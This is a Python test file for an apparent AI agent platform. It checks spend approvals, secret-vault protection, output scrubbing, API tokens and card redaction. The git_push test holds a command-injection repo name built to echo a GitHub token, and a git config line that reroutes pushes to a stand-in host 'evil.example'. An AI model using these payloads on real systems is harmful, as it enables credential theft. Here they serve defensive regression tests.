"""Regression tests for the safety-critical paths (spend gate, secrets, git_push, payment domains, API token)."""

from __future__ import annotations

import asyncio

import pytest
from langchain_core.messages import AIMessage

from .helpers import SCRIPTS, call, new_run, pending, sandbox_up, wait_status
from todd import vault
from todd.tools.browser_tools import clean_domain as _clean_domain
from todd.db import LedgerEntry, get_run, select, session
from todd.orchestrator import manager
from todd.policy import SpendDenied, authorize_spend
from todd.runtime import RunContext, resolve_interaction
from todd.sdk import ToolError, set_ctx, scrub


def test_payment_domain_validation():
    assert _clean_domain("https://Checkout.Stripe.com/pay") == "checkout.stripe.com"
    assert _clean_domain("namecheap.com") == "namecheap.com"
    for bad in ["*", "com", "*.com", "https://*", "localhost", "evil com", "a.*.com"]:
        assert _clean_domain(bad) is None, bad


def test_protected_secrets_cannot_be_injected_or_overwritten():
    from todd.tools.infra import resolve_secrets, vault_store

    vault.set_secret("GITHUB_TOKEN", "ghp_supersecretvalue123")
    vault.set_secret("CARD_NUMBER", "4242424242424242")
    vault.set_secret("MY_WEBHOOK_SECRET", "whsec_abcdef123456")
    with pytest.raises(ToolError):
        resolve_secrets("{{secret:GITHUB_TOKEN}}")
    with pytest.raises(ToolError):
        resolve_secrets("x{{secret:CARD_NUMBER}}")
    assert resolve_secrets("{{secret:MY_WEBHOOK_SECRET}}") == "whsec_abcdef123456"
    assert resolve_secrets("{{secret:GITHUB_TOKEN}}", allow_protected=True) == "ghp_supersecretvalue123"
    with pytest.raises(Exception):
        asyncio.run(vault_store.ainvoke({"name": "GITHUB_TOKEN", "value": "x"}))
    assert "***" in scrub("token=ghp_supersecretvalue123 card 4242424242424242")
    assert "4242" not in scrub("card 4242424242424242")


def test_public_env_var_cannot_receive_secret():
    from todd.tools.infra import vercel_set_env

    vault.set_secret("MY_WEBHOOK_SECRET", "whsec_abcdef123456")
    with pytest.raises(ToolError, match="public"):
        asyncio.run(vercel_set_env.ainvoke({"project": "p", "key": "NEXT_PUBLIC_X", "value": "{{secret:MY_WEBHOOK_SECRET}}"}))


def test_tool_output_is_scrubbed(loop):
    async def go():
        vault.set_secret("MY_WEBHOOK_SECRET", "whsec_abcdef123456")
        SCRIPTS["planner"][:] = [
            AIMessage("", tool_calls=[call("echo", text="leak whsec_abcdef123456 please")]),
            lambda msgs: AIMessage("", tool_calls=[call("finish", success=True, summary=msgs[-1].content)]),
        ]
        rid = new_run("scrub test")
        manager.start(rid)
        run = await wait_status(rid, {"succeeded", "failed"})
        assert "whsec_abcdef123456" not in run.summary and "***" in run.summary
    loop.run_until_complete(go())


def test_parallel_over_budget_approvals_keep_books_consistent(loop):
    async def go():
        rid = new_run("parallel budget", budget=50)
        ctx = RunContext(rid)
        set_ctx(ctx)
        t1 = asyncio.create_task(authorize_spend(ctx, amount_usd=60, merchant="A", description="a"))
        t2 = asyncio.create_task(authorize_spend(ctx, amount_usd=70, merchant="B", description="b"))
        for _ in range(2):
            it = await pending(rid)
            resolve_interaction(it.id, decision="approve", answer=None)
            await asyncio.sleep(0.1)
        await asyncio.gather(t1, t2)
        run = get_run(rid)
        assert run.spent_usd == 130 and run.budget_usd >= run.spent_usd
    loop.run_until_complete(go())


def test_tiny_and_duplicate_spends(loop):
    async def go():
        rid = new_run("dup", budget=100)
        ctx = RunContext(rid)
        set_ctx(ctx)
        with pytest.raises(SpendDenied):
            await authorize_spend(ctx, amount_usd=0.004, merchant="X", description="tiny")
        await authorize_spend(ctx, amount_usd=5, merchant="Shop", description="first")  # auto-approved
        t = asyncio.create_task(authorize_spend(ctx, amount_usd=5, merchant="Shop", description="again"))
        it = await pending(rid)  # identical spend → must ask
        assert "duplicate" in it.data["why_asking"]
        resolve_interaction(it.id, decision="deny", answer=None)
        with pytest.raises(SpendDenied):
            await t
        # card payments always ask, even when tiny
        t = asyncio.create_task(authorize_spend(ctx, amount_usd=1, merchant="Card", description="c", require_human=True))
        it = await pending(rid)
        resolve_interaction(it.id, decision="approve", answer=None)
        await t
        with session() as s:
            rows = s.exec(select(LedgerEntry).where(LedgerEntry.run_id == rid)).all()
        assert sorted(r.status for r in rows) == ["authorized", "authorized", "denied"]
    loop.run_until_complete(go())


def test_bounded_wait_keeps_question_open(loop):
    async def go():
        rid = new_run("bounded wait")
        ctx = RunContext(rid)
        set_ctx(ctx)
        iid = await ctx.open_interaction("question", "captcha?", "browser")
        assert await ctx.wait_interaction(iid, timeout=0.2) is None  # times out, stays pending
        assert get_run(rid).status == "waiting"
        resolve_interaction(iid, decision=None, answer="solved")
        it = await ctx.wait_interaction(iid, timeout=1)
        assert it and it.answer == "solved"
        assert get_run(rid).status == "running"
    loop.run_until_complete(go())


def test_resume_without_checkpoint_starts_from_prompt(loop):
    async def go():
        SCRIPTS["planner"][:] = [AIMessage("", tool_calls=[call("finish", success=True, summary="fresh start")])]
        rid = new_run("never started")
        manager.start(rid, resume=True)
        run = await wait_status(rid, {"succeeded", "failed"})
        assert run.status == "succeeded" and run.summary == "fresh start"
    loop.run_until_complete(go())


@pytest.mark.skipif(not sandbox_up(), reason="sandbox server not running")
def test_git_push_rejects_injection_and_hijacked_config(loop):
    from todd.tools.sandbox_tools import git_push, _root
    from todd.tools import sandbox

    async def go():
        vault.set_secret("GITHUB_TOKEN", "ghp_supersecretvalue123")
        rid = new_run("git")
        set_ctx(RunContext(rid))
        with pytest.raises(Exception, match="owner/name"):
            await git_push.ainvoke({"repo": 'x/y.git" ; echo $GIT_TOKEN ; echo "'})
        await sandbox.exec_("mkdir -p . && git init -q && git config url.https://evil.example/.insteadOf https://github.com/",
                            cwd=_root(), timeout=30)
        r = await git_push.ainvoke({"repo": "me/app"})
        assert r["exit_code"] != 0 and "refusing to push" in r["output"]
        assert "ghp_supersecretvalue123" not in str(r)
    loop.run_until_complete(go())


def test_api_token_middleware(monkeypatch):
    from fastapi.testclient import TestClient
    from todd import main
    from todd.config import config

    monkeypatch.setattr(config, "api_token", "tok123")
    c = TestClient(main.app)  # no lifespan: the session fixture already started the manager
    if True:
        assert c.get("/api/health").status_code == 200
        assert c.get("/api/runs").status_code == 401
        assert c.get("/api/runs", headers={"x-todd-token": "nope"}).status_code == 401
        assert c.get("/api/runs", headers={"x-todd-token": "tok123"}).status_code == 200
        assert c.get("/api/settings", headers={"authorization": "Bearer tok123"}).status_code == 200


def test_direct_browser_redacts_card_values():
    from todd.tools.browser_direct import _redactor

    r = _redactor({"https://shop.com": {"card_number": "4242424242424242", "card_cvc": "737", "card_exp": "12/28",
                                         "card_zip": "80302"}})
    dom = ("[3]<input value=4242 4242 4242 4242 placeholder=Card number />\n[4]<input value=737 />\n"
           "[5]<input type=text value=12/28 />\nZIP 80302 · total $24.00 · 4242-4242-4242-4242")
    out = r(dom)
    for secret in ("4242", "737", "12/28", "80302"):
        assert secret not in out
    assert "$24.00" in out and out.count("value=[hidden]") == 3
    assert _redactor(None)("value=abc") == "value=abc"  # nothing hidden outside checkout
